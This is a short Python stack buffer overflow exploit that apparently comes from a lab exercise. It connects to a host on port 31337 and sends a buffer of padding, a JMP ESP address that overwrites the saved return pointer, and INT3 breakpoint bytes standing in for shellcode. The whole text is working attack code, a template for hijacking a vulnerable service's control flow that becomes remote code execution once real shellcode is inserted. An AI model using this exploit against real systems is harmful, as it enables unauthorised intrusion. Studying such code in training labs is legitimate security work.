import socket
import struct

RHOST = "10.92.92.129"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buffer_total_length = 1024
offset_srp = 146

ptr_jmp_esp = 0x080414C3

buffer = b""
buffer += b"A" * (offset_srp - len(buffer)) # padding
buffer += struct.pack('<I', ptr_jmp_esp) # SRP overwrite
buffer += b"\xCC\xCC\xCC\xCC" # ESP points here
buffer += b"D" * (buffer_total_length - len(buffer)) # trailing padding
buffer += b"\n"

s.send(buffer)